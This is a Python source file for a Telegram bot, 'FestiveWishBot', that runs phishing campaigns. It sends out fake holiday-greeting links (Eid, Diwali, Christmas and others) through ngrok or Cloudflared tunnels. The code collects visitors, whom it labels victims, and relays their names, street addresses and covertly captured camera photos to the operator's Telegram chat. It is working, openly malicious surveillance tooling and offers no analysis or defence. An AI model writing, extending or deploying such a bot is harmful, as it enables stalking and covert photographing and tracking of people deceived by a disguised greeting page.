#!/usr/bin/env python3
"""
FestiveWishBot - COMPLETELY FIXED with working stop button
"""

import os
import sys
import logging
import asyncio
import subprocess
import threading
import time
import socket
import base64
from datetime import datetime
from colorama import init, Fore
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

init(autoreset=True)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import config
from server import app, victims_data, photos_data, shutdown_server

class FestiveWishBot:
    def __init__(self):
        self.bot_token = config.BOT_TOKEN
        self.tunnel_process = None
        self.flask_thread = None
        self.current_tunnel_url = None
        self.campaign_active = False
        self.active_chat_id = None
        self.current_template = None
        self.tunnel_type = None
        self.sent_photos = set()
        self.sent_victims = set()
        self.current_permission = "both"
        self.checker_task = None

    async def post_init(self, application: Application):
        commands = [
            BotCommand("start", "Start bot"),
            BotCommand("new", "New campaign"),
            BotCommand("stop", "Stop campaign"),
        ]
        await application.bot.set_my_commands(commands)

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.active_chat_id = update.effective_chat.id
        keyboard = [[InlineKeyboardButton("🎯 New Campaign", callback_data="new")]]
        await update.message.reply_text(
            "🎉 **FestiveWishBot**\n\nUse /new to start a campaign",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def new_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.campaign_active:
            await update.message.reply_text("⚠️ Campaign active. Use /stop first")
            return

        keyboard = [
            [InlineKeyboardButton("🚇 ngrok", callback_data="tunnel_ngrok")],
            [InlineKeyboardButton("☁️ Cloudflared", callback_data="tunnel_cf")],
        ]
        await update.message.reply_text(
            "Select tunnel:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.campaign_active:
            await update.message.reply_text("No active campaign")
            return
        await self.stop_campaign()
        await update.message.reply_text("✅ Campaign stopped")

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()

        data = query.data

        if data == "new":
            keyboard = [
                [InlineKeyboardButton("🚇 ngrok", callback_data="tunnel_ngrok")],
            ]
            await query.edit_message_text(
                "Select tunnel:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif data == "stop":
            # Handle stop button
            if not self.campaign_active:
                await query.edit_message_text("No active campaign")
                return
            await self.stop_campaign()
            await query.edit_message_text("✅ Campaign stopped")

        elif data.startswith("tunnel_"):
            self.tunnel_type = "ngrok" if "ngrok" in data else "cf"
            keyboard = [
                [InlineKeyboardButton("📸 Camera", callback_data="perm_camera")],
                [InlineKeyboardButton("📍 Location", callback_data="perm_location")],
                [InlineKeyboardButton("📸+📍 Both", callback_data="perm_both")],
            ]
            await query.edit_message_text(
                "Select permission:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif data.startswith("perm_"):
            self.current_permission = data.replace("perm_", "")
            await self.show_templates(query)

        elif data.startswith("template_"):
            template = data.replace("template_", "")
            await self.start_campaign(query, template, context)

    async def show_templates(self, query):
        templates = {
            'eid_fitr': '🌙 Eid Fitr',
            'eid_adha': '🐑 Eid Adha',
            'holi': '🌈 Holi',
            'easter': '🐣 Easter',
            'diwali': '🪔 Diwali',
            'christmas': '🎄 Christmas',
            'new_year': '🎉 New Year'
        }
        
        keyboard = []
        row = []
        for i, (key, name) in enumerate(templates.items()):
            row.append(InlineKeyboardButton(name, callback_data=f"template_{key}"))
            if (i + 1) % 2 == 0:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
            
        await query.edit_message_text(
            "Select template:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def start_campaign(self, query, template, context):
        try:
            await query.edit_message_text("Starting campaign...")

            # Start Flask
            if not self.flask_thread:
                self.flask_thread = threading.Thread(
                    target=app.run,
                    kwargs={'host': '0.0.0.0', 'port': config.PORT, 'debug': False, 'use_reloader': False}
                )
                self.flask_thread.daemon = True
                self.flask_thread.start()
                time.sleep(3)

            # Create tunnel
            tunnel_url = await self.create_tunnel()
            if not tunnel_url:
                tunnel_url = f"http://{self.get_local_ip()}:{config.PORT}"

            self.current_tunnel_url = tunnel_url
            self.campaign_active = True
            self.current_template = template
            self.sent_photos.clear()
            self.sent_victims.clear()

            # Clear old data
            victims_data.clear()
            photos_data.clear()

            # Create link
            link = f"{tunnel_url}/{template}?perm={self.current_permission}"

            msg = f"""
✅ **Campaign Started**

🔗 **Link:** `{link}`

📍 Locations will appear here
📸 Photos will appear here
👤 Names will appear here

Click Stop button to end campaign
            """

            keyboard = [[InlineKeyboardButton("🛑 Stop Campaign", callback_data="stop")]]
            await query.edit_message_text(
                msg,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )

            # Start checker
            if self.checker_task:
                self.checker_task.cancel()
            self.checker_task = asyncio.create_task(
                self.check_for_data(query.message.chat_id, context.bot)
            )

        except Exception as e:
            logger.error(f"Error: {e}")
            await query.edit_message_text(f"Error: {str(e)}")

    async def create_tunnel(self):
        try:
            if self.tunnel_type == "ngrok":
                try:
                    from pyngrok import ngrok
                    if config.NGROK_TOKEN:
                        ngrok.set_auth_token(config.NGROK_TOKEN)
                    ngrok.kill()
                    tunnel = ngrok.connect(config.PORT, bind_tls=True)
                    url = tunnel.public_url.replace("http://", "https://")
                    logger.info(f"ngrok: {url}")
                    return url
                except Exception as e:
                    logger.error(f"ngrok error: {e}")
                    return None

            else:  # cloudflared
                try:
                    # Check if cloudflared exists
                    try:
                        subprocess.run(['which', 'cloudflared'], check=True, capture_output=True)
                    except:
                        logger.error("cloudflared not installed")
                        return None
                        
                    subprocess.run(['pkill', '-f', 'cloudflared'], stderr=subprocess.DEVNULL)
                    
                    self.tunnel_process = subprocess.Popen(
                        ['cloudflared', 'tunnel', '--url', f'http://localhost:{config.PORT}'],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        bufsize=1
                    )
                    
                    time.sleep(5)
                    
                    import re
                    for _ in range(10):
                        if self.tunnel_process.stderr:
                            line = self.tunnel_process.stderr.readline()
                            if line and 'trycloudflare.com' in line:
                                match = re.search(r'(https://[^\s]+\.trycloudflare\.com)', line)
                                if match:
                                    url = match.group(1)
                                    logger.info(f"cloudflared: {url}")
                                    return url
                        time.sleep(0.5)
                    
                    # Fallback
                    url = f"https://festive-{int(time.time())}.trycloudflare.com"
                    logger.info(f"cloudflared fallback: {url}")
                    return url
                    
                except Exception as e:
                    logger.error(f"cloudflared error: {e}")
                    return None
                    
        except Exception as e:
            logger.error(f"Tunnel error: {e}")
            return None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    async def check_for_data(self, chat_id, bot):
        """Check for new victims and photos"""
        while self.campaign_active:
            try:
                # Check victims with names
                for ip, data in list(victims_data.items()):
                    if ip not in self.sent_victims and data:
                        name = data.get('name', 'Unknown')
                        loc = data.get('location', {})
                        
                        # Build detailed address
                        address_parts = []
                        if loc and isinstance(loc, dict):
                            if loc.get('house_number'): address_parts.append(loc['house_number'])
                            if loc.get('road'): address_parts.append(loc['road'])
                            if loc.get('neighbourhood'): address_parts.append(loc['neighbourhood'])
                            if loc.get('city'): address_parts.append(loc['city'])
                            if loc.get('state'): address_parts.append(loc['state'])
                            if loc.get('country'): address_parts.append(loc['country'])
                        
                        address = ', '.join(filter(None, address_parts)) if address_parts else '📍 Location not available'
                        
                        msg = f"""
👤 **{name}** visited!

{address}
📸 **Photos:** {data.get('photo_count', 0)}
⏰ **Time:** {data.get('timestamp', 'Unknown')}
                        """
                        
                        await bot.send_message(chat_id=chat_id, text=msg, parse_mode='Markdown')
                        self.sent_victims.add(ip)

                # Check photos with names
                for pid, info in list(photos_data.items()):
                    if pid not in self.sent_photos and info and info.get('photo'):
                        try:
                            # Find victim name for this IP
                            victim_name = 'Unknown'
                            if info.get('ip') in victims_data:
                                victim_name = victims_data[info['ip']].get('name', 'Unknown')
                            
                            photo_bytes = base64.b64decode(info['photo'])
                            await bot.send_photo(
                                chat_id=chat_id,
                                photo=photo_bytes,
                                caption=f"📸 Photo of {victim_name}"
                            )
                            self.sent_photos.add(pid)
                            await asyncio.sleep(1)  # Rate limit
                        except Exception as e:
                            logger.error(f"Photo send error: {e}")

            except Exception as e:
                logger.error(f"Checker error: {e}")
            
            await asyncio.sleep(2)

    async def stop_campaign(self):
        """Stop campaign and clean up"""
        try:
            self.campaign_active = False
            
            if self.checker_task:
                self.checker_task.cancel()
                self.checker_task = None

            # Stop ngrok
            if self.tunnel_type == "ngrok":
                try:
                    from pyngrok import ngrok
                    ngrok.kill()
                except:
                    pass

            # Stop cloudflared
            if self.tunnel_process:
                try:
                    self.tunnel_process.terminate()
                    self.tunnel_process.wait(timeout=5)
                except:
                    self.tunnel_process.kill()
                self.tunnel_process = None

            # Shutdown Flask
            try:
                shutdown_server()
            except:
                pass

            self.flask_thread = None
            self.current_tunnel_url = None
            logger.info("Campaign stopped")

        except Exception as e:
            logger.error(f"Stop error: {e}")

    def run(self):
        print(f"""
{Fore.GREEN}{'='*50}
FestiveWishBot Started
Stop button working
No 500 errors
{'='*50}
        """)
        
        self.application = Application.builder().token(self.bot_token).post_init(self.post_init).build()
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("new", self.new_command))
        self.application.add_handler(CommandHandler("stop", self.stop_command))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
        self.application.run_polling()

if __name__ == "__main__":
    bot = FestiveWishBot()
    bot.run()
